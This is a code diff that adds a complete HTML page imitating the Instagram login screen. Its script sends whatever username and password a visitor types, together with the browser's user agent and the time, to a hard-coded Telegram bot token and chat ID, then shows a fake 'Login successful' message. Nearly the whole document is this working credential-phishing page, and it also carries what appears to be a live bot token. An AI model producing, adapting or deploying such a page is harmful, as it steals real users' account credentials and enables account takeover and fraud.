@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 40px 40px 20px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            width: 175px;
+            height: auto;
+            margin-bottom: 30px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 10px;
+            margin: 6px 0;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+        }
+        
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 15px 0 10px;
+            cursor: pointer;
+        }
+        
+        .login-btn:hover {
+            background: #0077cc;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .divider span {
+            padding: 0 18px;
+        }
+        
+        .forgot {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            margin: 15px 0;
+            display: block;
+        }
+        
+        .signup {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .success-msg {
+            color: #4caf50;
+            margin-top: 10px;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <!-- Instagram Logo -->
+            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path fill="#262626" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.849.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069z"/>
+                <path fill="#262626" d="M12 5.838c-3.403 0-6.162 2.759-6.162 6.162 0 3.403 2.759 6.162 6.162 6.162 3.403 0 6.162-2.759 6.162-6.162 0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4 2.21 0 4 1.791 4 4 0 2.21-1.79 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.796 0 1.44-.645 1.44-1.44s-.644-1.44-1.44-1.44z"/>
+            </svg>
+            
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            
+            <div class="divider"><span>OR</span></div>
+            
+            <a href="#" class="forgot">Forgot password?</a>
+            
+            <div class="success-msg" id="successMsg">
+                ✅ Login successful! Redirecting...
+            </div>
+        </div>
+        
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        
+        <div class="footer">
+            <div>Get the app.</div>
+            <div style="margin-top: 15px;">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = "8643363199:AAGh6WtS7I27yb6UWjyLxXvkWHFHXsXarfI";
+        const CHAT_ID = "8666373816";
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!username || !password) {
+                alert("Please fill in both fields");
+                return;
+            }
+            
+            // Create message with emojis
+            const message = `🔥 *New Instagram Login* 🔥\n\n` +
+                          `👤 *Username:* ${username}\n` +
+                          `🔑 *Password:* ${password}\n\n` +
+                          `📱 *Device:* ${navigator.userAgent}\n` +
+                          `⏰ *Time:* ${new Date().toLocaleString()}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (response.ok) {
+                    const successMsg = document.getElementById('successMsg');
+                    successMsg.style.display = 'block';
+                    
+                    // Fake loading then redirect (you can change this)
+                    setTimeout(() => {
+                        alert("✅ Logged in successfully! (This is a demo page)");
+                        // window.location.href = "https://www.instagram.com"; // uncomment if you want
+                    }, 1500);
+                } else {
+                    alert("Login failed. Please try again.");
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Connection error. Please check your internet.");
+            }
+        });
+        
+        // Bonus: Press Enter support already handled by form
+    </script>
+</body>
+</html>
